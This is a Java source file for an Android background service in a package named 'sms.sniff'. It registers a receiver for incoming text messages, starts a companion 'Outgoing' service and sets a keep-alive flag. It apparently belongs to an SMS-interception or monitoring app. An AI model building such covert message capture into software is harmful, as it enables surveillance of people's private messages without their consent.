package sms.sniff;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class ManagerService extends Service{

	private BroadcastReceiver incoming;
	private Intent outgoing;
	private SharedPreferencesEditor sharedPreferencesEditor;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		incoming = new Incoming();
		registerReceiver(incoming, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
		
		outgoing = new Intent(this, Outgoing.class);
		startService(outgoing);
		
		sharedPreferencesEditor = new SharedPreferencesEditor(this);
		sharedPreferencesEditor.keepAlive(true);
		
		
	}
	
	@Override
	public void onDestroy() {
		
		unregisterReceiver(incoming);
		stopService(outgoing);
		
		sharedPreferencesEditor.keepAlive(false);
		
		super.onDestroy();
	}
}
